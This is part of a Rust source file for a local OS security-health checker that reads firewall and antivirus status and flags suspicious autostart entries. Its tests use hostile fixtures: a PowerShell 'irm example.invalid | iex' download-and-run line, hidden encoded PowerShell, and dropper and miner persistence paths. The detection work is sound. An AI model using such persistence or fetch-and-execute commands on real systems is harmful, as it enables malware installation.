                let fname = entry.file_name().to_string_lossy().into_owned();
                if let Some(finding) = inspect_linux_autostart_entry(scope, &fname, &raw) {
                    suspicious_entries.push(finding);
                }
            }
        }
    }

    build_security_health_report(
        "linux",
        None,
        None,
        fw_enabled,
        None,
        None,
        checks,
        suspicious_entries,
        now_secs(),
    )
}

pub fn collect_os_security_health_blocking() -> OsSecurityHealthReport {
    #[cfg(target_os = "windows")]
    {
        collect_windows_security_health()
    }
    #[cfg(target_os = "macos")]
    {
        collect_macos_security_health()
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        collect_linux_security_health()
    }
}

/// Read-only, 100% local OS security posture summary (zero network calls).
#[tauri::command]
pub async fn os_security_health() -> AppResult<OsSecurityHealthReport> {
    tauri::async_runtime::spawn_blocking(collect_os_security_health_blocking)
        .await
        .map_err(|e| AppError::Other(format!("background task failed: {e}")))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn decodes_security_center_product_state_and_windows_json() {
        // 397568 = 0x061100 -> enabled ((state >> 12) & 0xF == 1), up-to-date ((state >> 4) & 0xF == 0)
        assert_eq!(decode_security_center_product_state(397_568), (true, true));
        // 393472 = 0x060100 -> disabled (0x0), up-to-date
        assert_eq!(decode_security_center_product_state(393_472), (false, true));
        // 397584 = 0x061110 -> enabled (0x1), out-of-date (0x1)
        assert_eq!(decode_security_center_product_state(397_584), (true, false));

        // 1. Defender enabled + single-object firewall
        let defender_json = r#"{
            "defender": {"AntivirusEnabled": true, "RealTimeProtectionEnabled": true, "DefenderSignaturesOutOfDate": false},
            "av_products": {"displayName": "Windows Defender", "productState": 397568},
            "firewall": [
                {"Name": "Domain", "Enabled": true},
                {"Name": "Private", "Enabled": true},
                {"Name": "Public", "Enabled": true}
            ]
        }"#;
        let parsed = parse_windows_security_json(defender_json);
        assert_eq!(parsed.defender_enabled, Some(true));
        assert_eq!(parsed.defender_realtime, Some(true));
        assert_eq!(parsed.firewall_enabled, Some(true));
        assert_eq!(parsed.third_party_av_name.as_deref(), Some("Windows Defender"));

        // 2. Third-party AV enabled even if Defender is false
        let third_party = r#"{
            "defender": {"AntivirusEnabled": false, "RealTimeProtectionEnabled": false},
            "av_products": [
                {"displayName": "Windows Defender", "productState": 393472},
                {"displayName": "Bitdefender Antivirus", "productState": 266240}
            ],
            "firewall": {"Name": "Private", "Enabled": false}
        }"#;
        let parsed_tp = parse_windows_security_json(third_party);
        assert_eq!(parsed_tp.third_party_av_name.as_deref(), Some("Bitdefender Antivirus"));
        assert_eq!(parsed_tp.third_party_av_enabled, Some(true));
        assert_eq!(parsed_tp.firewall_enabled, Some(false));

        // 3. Real Get-NetFirewallProfile GpoBoolean integer output ("Enabled": 1 / 0)
        let gpo_int_on = r#"{"firewall":[{"Name":"Domain","Enabled":1},{"Name":"Private","Enabled":1},{"Name":"Public","Enabled":1}],"av_products":[{"displayName":"Windows Defender","productState":397568}],"defender":{"AntivirusEnabled":true,"RealTimeProtectionEnabled":true,"DefenderSignaturesOutOfDate":false}}"#;
        let parsed_int_on = parse_windows_security_json(gpo_int_on);
        assert_eq!(parsed_int_on.firewall_enabled, Some(true));
        assert!(parsed_int_on.firewall_profiles_summary.contains("Active"));

        let gpo_int_off = r#"{"firewall":[{"Name":"Domain","Enabled":1},{"Name":"Public","Enabled":0}],"av_products":[],"defender":null}"#;
        let parsed_int_off = parse_windows_security_json(gpo_int_off);
        assert_eq!(parsed_int_off.firewall_enabled, Some(false));

        let gpo_str = r#"{"firewall":[{"Name":"Private","Enabled":"1"},{"Name":"Public","Enabled":"true"}]}"#;
        assert_eq!(parse_windows_security_json(gpo_str).firewall_enabled, Some(true));

        // 4. Defender fallback: Get-MpComputerStatus fails (defender: null) while SecurityCenter2 reports Windows Defender
        let sc2_fallback_json = r#"{"defender":null,"av_products":[{"displayName":"Windows Defender","productState":397568}],"firewall":[{"Name":"Private","Enabled":1}]}"#;
        let parsed_fb = parse_windows_security_json(sc2_fallback_json);
        let (fb_en, fb_name, fb_status, _fb_detail) = evaluate_windows_av_status(&parsed_fb);
        assert_eq!(fb_en, Some(true));
        assert_eq!(fb_name.as_deref(), Some("Windows Defender"));
        assert_eq!(fb_status, "ok");

        // 5. Invalid/empty JSON returns safe default
        assert_eq!(parse_windows_security_json("not json"), WindowsSecurityParsed::default());
    }

    #[test]
    fn windows_run_entry_flags_threats_without_false_positives() {
        // Existing system executable outside staging folders should NOT be flagged
        #[cfg(windows)]
        if let Ok(root) = std::env::var("SystemRoot") {
            let notepad = format!(r#""{root}\notepad.exe" --background"#);
            assert!(inspect_windows_run_entry("HKCU\\Run", "NotepadHelper", &notepad).is_none());
        }

        // Existing system binary should NOT be flagged
        #[cfg(windows)]
        if let Ok(root) = std::env::var("SystemRoot") {
            let legit = format!(r#""{root}\System32\cmd.exe" /c echo ok"#);
            assert!(inspect_windows_run_entry("HKCU\\Run", "EchoTest", &legit).is_none());
        }

        // LOLBin boundary checks: .json/.jsp, tiexplorer, -encoding/-encrypt must NOT trigger false positives
        #[cfg(windows)]
        if let Ok(root) = std::env::var("SystemRoot") {
            let ps_json = format!(
                r#""{root}\System32\WindowsPowerShell\v1.0\powershell.exe" -OutputFormat Text -Encoding UTF8 -File "{root}\config.json""#
            );
            assert!(inspect_windows_run_entry("HKCU\\Run", "PsJsonConfig", &ps_json).is_none());

            let cmd_tiexplorer = format!(
                r#""{root}\System32\cmd.exe" /c start "" "{root}\tiexplorer.exe" --encrypt-cache app.jsp"#
            );
            assert!(inspect_windows_run_entry("HKCU\\Run", "TieExplorer", &cmd_tiexplorer).is_none());
        }

        // Real script extension (.js) and delimited LOLBin flags (-enc, iex) MUST be flagged high
        let real_js = inspect_windows_run_entry(
            "HKCU\\Run",
            "BadJs",
            r#"wscript.exe "C:\ProgramData\bad\payload.js" //nologo"#,
        )
        .expect("real .js script argument must be flagged");
        assert_eq!(real_js.severity, "high");

        let real_iex = inspect_windows_run_entry(
            "HKCU\\Run",
            "BadIex",
            r#"powershell.exe -NoProfile -Command "irm example.invalid | iex""#,
        )
        .expect("delimited iex must be flagged");
        assert_eq!(real_iex.severity, "high");

        let real_enc = inspect_windows_run_entry(
            "HKCU\\Run",
            "BadShortEnc",
            r#"powershell.exe -enc SQBFAFgA"#,
        )
        .expect("-enc flag must be flagged");
        assert_eq!(real_enc.severity, "high");

        // Unresolved %VAR% should NOT be flagged
        assert!(inspect_windows_run_entry(
            "HKCU\\Run",
            "EnvApp",
            r"%UNRESOLVED_SWEEPR_TEST_VAR%\App\app.exe"
        )
        .is_none());

        // Encoded PowerShell LOLBin MUST be flagged high
        let enc_ps = inspect_windows_run_entry(
            "HKCU\\Run",
            "Updater",
            r#"powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgA"#,
        )
        .expect("encoded powershell must be flagged");
        assert_eq!(enc_ps.severity, "high");

        // Staging Temp/Public binary MUST be flagged high
        let temp_bin = inspect_windows_run_entry(
            "HKCU\\Run",
            "TempDrop",
            r#"C:\Users\Public\helper.exe"#,
        )
        .expect("Public folder binary must be flagged");
        assert_eq!(temp_bin.severity, "high");

        // Missing absolute exe flagged low
        let missing = inspect_windows_run_entry(
            "HKCU\\Run",
            "GoneApp",
            r#""C:\NonExistentSweeprTestDir12345\app.exe" --tray"#,
        )
        .expect("missing target must be flagged");
        assert_eq!(missing.severity, "low");
    }

    #[test]
    fn macos_and_linux_parsers_and_report_builder() {
        assert_eq!(parse_gatekeeper_status("assessments enabled\n"), Some(true));
        assert_eq!(parse_gatekeeper_status("assessments disabled\n"), Some(false));
        assert_eq!(parse_gatekeeper_status("unknown"), None);

        let plist = r#"<plist><dict><key>CFBundleShortVersionString</key><string>2199</string></dict></plist>"#;
        assert_eq!(parse_plist_short_version(plist).as_deref(), Some("2199"));
        assert_eq!(parse_socketfilterfw_state("Firewall is enabled. (State = 1)"), Some(true));

        let evil_plist = "<plist><dict><key>ProgramArguments</key><array><string>/tmp/dropper</string></array></dict></plist>";
        assert_eq!(
            inspect_macos_launch_agent("~/Library/LaunchAgents", "com.evil.plist", evil_plist)
                .map(|s| s.severity),
            Some("high".to_string())
        );

        assert_eq!(
            parse_linux_firewall_status(Some("Status: active\n"), None, None).0,
            Some(true)
        );
        assert_eq!(
            parse_linux_firewall_status(None, Some("ENABLED=yes\n"), None).0,
            Some(true)
        );
        assert_eq!(
            parse_linux_firewall_status(None, None, Some("running\n")).0,
            Some(true)
        );
        assert_eq!(
            inspect_linux_autostart_entry(
                "~/.config/autostart",
                "bad.desktop",
                "[Desktop Entry]\nExec=/tmp/miner --bg\n"
            )
            .map(|s| s.severity),
            Some("high".to_string())
        );

        let healthy = build_security_health_report(
            "windows",
            Some(true),
            Some("Microsoft Defender".into()),
            Some(true),
            None,
            None,
            vec![SecurityCheckItem {
                id: "av".into(),
                label: "AV".into(),
                status: "ok".into(),
                detail: "Enabled".into(),
            }],
            Vec::new(),
            1700000000,
        );
        assert!(healthy.local_only);
        assert_eq!(healthy.overall_status, "healthy");
        assert_eq!(healthy.checks.len(), 2);
    }
}
